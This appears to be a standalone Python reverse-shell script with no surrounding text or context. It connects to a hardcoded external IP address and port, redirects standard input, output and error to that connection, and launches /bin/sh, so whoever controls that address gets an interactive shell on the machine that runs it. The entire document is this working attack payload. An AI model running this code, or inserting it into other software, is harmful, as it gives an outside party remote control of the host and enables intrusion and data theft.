import socket,subprocess,os
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('194.238.19.162',4321))
[os.dup2(s.fileno(),f)for f in(0,1,2)]
subprocess.call(["/bin/sh"])
